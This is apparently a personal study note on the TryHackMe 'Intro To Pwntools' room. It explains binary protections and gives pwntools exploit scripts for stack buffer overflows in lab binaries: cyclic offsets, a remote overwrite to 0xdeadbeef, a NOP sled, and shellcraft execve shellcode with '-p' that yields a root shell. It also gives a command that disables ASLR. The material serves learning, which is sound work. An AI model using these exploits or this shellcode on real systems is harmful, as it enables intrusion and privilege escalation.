
2024-06-24 19:44

Source: #tryhackme #py 

Tags: [[pwntools]] 

#### Checksec tool

##### RELRO
stands for Relocation Read-Only, which makes the global offset table (GOT) read-only after the linker resolves functions to it. The GOT is important for techniques such as the ret-to-libc attack you can refer to this blog post: [https://www.redhat.com/en/blog/hardening-elf-binaries-using-relocation-read-only-relro](https://www.redhat.com/en/blog/hardening-elf-binaries-using-relocation-read-only-relro).
##### Stack canaries 
are tokens placed after a stack to detect a stack overflow. stack canaries sit beside the stack in memory (where the program variables are stored), and if there is a stack overflow, then the canary will be corrupted. This allows the program to detect a buffer overflow and shut down. You can read more about stack canaries here: [https://www.sans.org/blog/stack-canaries-gingerly-sidestepping-the-cage/](https://www.sans.org/blog/stack-canaries-gingerly-sidestepping-the-cage/).
##### NX
is short for non-executable. If this is enabled, then memory segments can be either writable or executable, but not both. This stops potential attackers from injecting their own malicious code (called shellcode) into the program, because something in a writable segment cannot be executed. - [https://en.wikipedia.org/wiki/Executable_space_protection](https://en.wikipedia.org/wiki/Executable_space_protection)
##### PIE
stands for Position Independent Executable. This loads the program dependencies into random locations, so attacks that rely on memory layout are more difficult to conduct. Here is a good blog about this: [https://access.redhat.com/blogs/766093/posts/1975793](https://access.redhat.com/blogs/766093/posts/1975793)

#### Cyclic - for pattern generation

If you view the c code, you may notice the` print_flag() `function, which will open the flag with the permissions we need. The issue is that the function does not run in the program, the program simply calls start() then ends.

- This program is vulnerable to a buffer overflow, because it uses the `gets()` function, which does not check to see if the user input is actually in bounds (you can read about this [here](https://faq.cprogramming.com/cgi-bin/smartfaq.cgi?answer=1049157810&id=1043284351))
- An important part of the memory we can overwrite is the instruction pointer (`IP`), which is called the `eip` on 32-bit machines, and `rip` on 64-bit machines.
- To control the `IP`, the first thing we need do is to is overflow the stack with a pattern, so we can see where the IP is

- fire up `gdb` using `gdb file_name`
- To run a program in `gdb`, type `r`
- if you want to add an input from a text file, you use the "<" key, `r < alphabet`

If you have used `pattern_create` from the `Metasploit` Framework, this is works in a similar way. We can create a pattern file like this:

`cyclic 100 > pattern`

and then run the pattern file as input in `gdb`. We have a segmentation-fault and the `eip` is filled with '`jaaa`'

Our padding is the space we need to get to the `eip`, so 100 is not the number we need. We need our padding to stop right before '`jaaa`' so that we can fill in the `eip` with our own input. -> we use `cyclic_find` for this

for conversion of ascii to raw hex we can use `p32()` function (and `p64` for 64-bit programs) from `pwn`

to print the location of a function, a function that is written in the program but it isn't called by the main function    -    `print& print_flag` output from this code is used in place of `outie` in the below code 

```
from pwn import *
padding = cyclic(cyclic_find('jaaa'))
eip = outie
payload = padding + eip
print(payload)
```
#### Networking

Note from machine  - 
I'm running a service on port 1337, which has an overflow vulnerability. I've left you a version that will run on port 1336 so that you can develop your exploit. 

Code for this level is found in the references section 

The struct at the beginning of the function, called targets, has two variables: `buff` and `printflag`. The buff is a char array of size `MAX` (`MAX` was defined to `32`), and the `printflag` is a volatile `int`. These variables will be right next to each other in the stack, so if we manage to overflow the `buff` variable, then we can edit the `printflag`. If you see further down in the code, if the `printflag` variable is equal to `0xdeadbeef` (in hex) then it will send the flag

ln 2- a script to connect to the port, receive the data, and send our payload. To connect to a port in Pwntools, use the `remote()` function in the format of: `remote(IP, port).`

ln 3- We can receive data with either the `recvn(bytes)` or `recvline()` functions.
- The `recvn()` receives as many bytes as specified
- the `recvline()` will receive data until there is a newline. 
Our code does not send a newline, so we will have to use `recvn()`. In our `test_networking.c` code, the "Give me `deadbeef`: " is 18 bytes, so we will receive 18 bytes.

ln 4,5 - We have to send enough data to overflow the buff variable, and write to the `printflag`. the buff is a 32 byte array, so we can write some character 32 times to overflow buff, and then write our 0xdeadbeef to `printflag`.

ln 7- To receive our flag, We can just use `connect.recvn()` again. According to the `c` code, the flag will be 34 bytes long.

```
from pwn import *
connect = remote('127.0.0.1', 1336)
print(connect.recvn(18))
payload = "A"*32
payload += p32(0xdeadbeef)
connect.send(payload)
print(connect.recvn(34))
```
#### Shellcraft

##### ASLR Disabling 

 ASLR, which stands for address space layout randomization. This randomizes where in memory the executable is loaded each time it is run. Like PIE, it makes attacks that rely on memory layout more difficult.
 in order to disable [[ASLR]] we can run the following with sudo 
```
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

##### Redirecting EIP and about NOP

executable code from machine - 
```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void start(){
        char input[64];
        gets(input);
}

// If we view the code for our executable, we see there is not much, just a call of //gets(). If we remember from our cyclic task, gets() is vulnerable to buffer overflow, // but this time, there is no print_flag() to jump to. When we control the eip, where  // should we jump to?

int main(){
        printf("Hello There. Do you have an input for me?\n");
        start();

}
```
Although there does not seem to be any useful instructions inside our code, what if we wrote our own instructions? Our variables are stored in memory, just like the program itself, so if we write instructions in our variable, and direct the `eip` to it, we can make the program follow our own instructions! This injected code is called shellcode, because it is traditionally (but not always) used to spawn a shell. If you recall, our variables are stored in the stack, so if we direct the `eip` to the stack, we will direct it to our shellcode.

- Once we control the `eip`, we need to direct it to the stack where we can place our own code. The top of the stack is pointed to by the `SP` (or stack pointer) which is called `esp` in 32-bit machines.  
- If we want to jump to our shellcode, we want to jump to the middle of the stack (rather than the top where the SP points), so we usually add an offset to the `esp` location in your exploit.
- I use an offset of 200, because that's what ended up working for me. In other challenges, you may only need an offset of 8 or 16. I have found that choosing the right offset is a matter of trial and error.

```
from pwn import *
padding = cyclic(cyclic_find('taaa'))
eip = p32(0xffffd52c+200)
nop_slide = "\x90"*1000
shellcode = "\xcc"
payload = padding + eip + nop_slide + shellcode
print(payload)
```

- You may be wondering how we are going to point the `eip` to our shellcode (rather than other data in the stack), and the answer is to make our variable into a big landing spot. 
- There is an instruction in assembly called no-operation (or NOP), which is 0x90 in hex, and the NOP is a space holder that passes the `eip` to the next space in memory.
- If we make a giant "landing pad" of NOPs, and direct the `eip` towards the middle of the stack, odds are that the `eip` will land on our NOP pad, and the NOPs will pass the `eip` down to eventually hit our shellcode.
- This is often called a NOP slide (or sled), because the `eip` will land in the NOPs and slide down to the shellcode. 
	`nop_slide = "\x90"*1000`   -    a NOP sled of 1000 is set here

Before we write our shellcode, we can inject a breakpoint at the end of our NOP slide to make sure the slide works. The breakpoint instruction in hex is "0xcc", and so we can add the following to our code:
	`shellcode = "\xcc"`

##### Shellcraft ~ msfvenom

The command line command for `shellcraft` is: `shellcraft arch.OS.command`

`shellcraft i386.linux.sh`
This is for a basic bash shell for Linux executables with i386 architecture. A neat feature of shellcraft is that we can print out the shellcode in different formats with the `-f` flag
```
$ shellcraft i386.linux.sh -f a
    /* execve(path='/bin///sh', argv=['sh'], envp=0) */
    ....
```

In order to get a root shell, we need to keep the privileges of intro2pwnFinal, although bash will drop the privileges unless we add the `-p` flag. ([[Privilege Escalation]]) If we observe the assembly code for this shell, we see that it uses `execve` and passes` /bin///sh` as the first parameter and `['sh']` as the second. 
1. The first parameter is the path to what we want to execute
2. the second parameter is the `argv` array, which contains the command line arguments (If you are confused about `execve`, you can refer to this man page [here](https://man7.org/linux/man-pages/man2/execve.2.html)).  
In this case, we want to execute `/bin///sh`, but we want to pass `'sh'` and `'-p'` into the `argv` array. We can use `shellcraft` to create `execve` shellcode with`"/bin///sh"` and `"['sh', '-p']"` as parameters. We can do this with the following command:
```
shellcraft i386.linux.execve "/bin///sh" "['sh', '-p']" -f a
```

When we run this command, we see it is the same as the linux.sh shellcode, except the added '-p' to the argv array. To write shellcode that is easier to use in our python exploit script, we can replace the "-f a" with "-f s", which will print our shellcode in string format. We can copy that and paste it into our exploit code (replacing the breakpoint instruction)
`shellcode = "jhh\x2f\x2f\....."`

in pwntools, for a local process, we use the `process()` function.

 we need a way to communicate with the shell we have just spawned. We can do it with `.interactive()`

we get a shell as root .

### References

[TryHackMe | Intro To Pwntools](https://tryhackme.com/r/room/introtopwntools)

codes - [IntroToPwntools/pwn_network.py at main · dizmascyberlabs/IntroToPwntools · GitHub](https://github.com/dizmascyberlabs/IntroToPwntools/blob/main/pwn_network.py)

walkthrough - [gitbook-tryhackme/walkthroughs/easy/intro-to-pwntools.md at master · shoulderhu/gitbook-tryhackme · GitHub](https://github.com/shoulderhu/gitbook-tryhackme/blob/master/walkthroughs/easy/intro-to-pwntools.md)

**shellcraft** - 
You may have heard of the [heap buffer overflow vulnerability in sudo](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3156) which allowed for quick privilege escalation. The exploit, discovered in 2021, has its own [room on TryHackMe](https://tryhackme.com/room/sudovulnssamedit) if you are interested in learning more about it.